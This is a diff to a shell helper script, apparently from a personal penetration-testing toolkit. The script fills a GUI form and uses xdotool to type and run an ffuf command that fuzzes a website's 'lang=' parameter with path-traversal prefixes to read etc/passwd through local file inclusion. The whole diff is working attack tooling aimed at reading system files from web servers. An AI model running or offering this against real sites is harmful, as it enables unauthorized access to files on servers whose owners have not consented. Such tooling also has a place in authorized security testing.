@@ -4,16 +4,16 @@
 fuzz for LFI root directory with custom wordlist
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
+FILE_FIELD=$(form_item "file" "file" "etc/passwd")
 
-# Generate gui form
-generate_form "Website"
+# Generate GUI form
+generate_form "${WEBSITE_FIELD}" "${FILE_FIELD}"
 
-WEBSITE=${form_data["Website"]}
-FILE="/tmp/directory_structure.txt"
+WEBSITE=${form_data["website"]}
+FILE=${form_data["file"]}
+WORDLIST="${SCRIPTS_DIR}/web/lfi/.files/root_directory_wordlist.txt"
 
-# Create directory wordlist
-seq 1 20 | awk '{for(i=1;i<=$1;i++)printf "../"; print ""}' > $FILE
-
-paste_command "ffuf -w ${FILE}:FUZZ -u '${WEBSITE}FUZZetc/passwd'"
+paste_command "ffuf -w ${WORDLIST}:FUZZ -u '${WEBSITE}FUZZ${FILE}'"
+xdotool key Return
